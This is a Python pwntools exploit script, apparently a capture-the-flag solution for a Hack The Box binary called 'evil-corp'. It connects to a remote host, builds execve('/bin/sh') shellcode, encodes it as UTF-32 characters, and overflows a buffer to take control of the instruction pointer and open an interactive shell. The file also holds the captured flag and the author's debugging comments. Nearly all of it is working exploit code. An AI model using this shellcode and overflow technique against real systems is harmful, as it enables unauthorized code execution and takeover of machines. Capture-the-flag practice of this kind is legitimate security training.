from pwn import *
import time
import struct
context.arch = 'amd64'
def to_utf(a):
    """ a = struct.pack('I', 0x104141) """
    b = struct.pack('I', a)
    return b.decode('utf-32')


LOCAL = False
if LOCAL:
    r = process('./evil-corp')
else:
    r = remote('94.237.49.212',44723)

r.sendlineafter(": ", "eliot")
r.sendlineafter(": ", "4007")
""" gdb.attach(r) """
""" time.sleep(1) """

# need 2 byte shellcode?
# sending shellcode 2 bytes at a time actually
inst = [
    'movabs rbx, 0x0068732f6e69622f',
    'push rbx',
    'push rsp',
    'pop rdi',
    'xor rsi, rsi',
    'xor rax, rax',
    'mov al, 59',
    'syscall' 
]
shellcode = b''
for i in inst:
    shellcode += asm(i)
shellcode += b'\x90'
print(shellcode, len(shellcode))

to_send = ''
for i in range(0, len(shellcode), 2):
    temp = int.from_bytes(shellcode[i:i+2], byteorder='little')
    temp = to_utf(temp)
    to_send += temp

print(len(to_send))
four_byte_char = to_utf(0x4243)
to_send = 0x800 * to_utf(0x4141) + to_send


send_size = 0x3e80 - len(to_send) * 4
to_send += four_byte_char * (send_size // 4) 
r.sendlineafter(">> ", "2")
# lower 4 bytes, upper 4 bytes
payload = to_utf(0x11000) + to_utf(0x0)
r.sendlineafter("\n\n", to_send + 'AB' + payload) # DE is the instruction 

# this gives rip control, but how do i write my shellcode onto the stack?
# that is the real question 
# the problem is that I am not sure how to write data into the rwx page
# 


r.interactive()



# Flag: HTB{45c11_15_N07_4L0000n3}


# okay, shellcode is good but slightly off 
# the executable region is 0x10000 past 
'''
We are copying 2 bytes to the page 
So we should be sending at the 0x500 mark?
'''
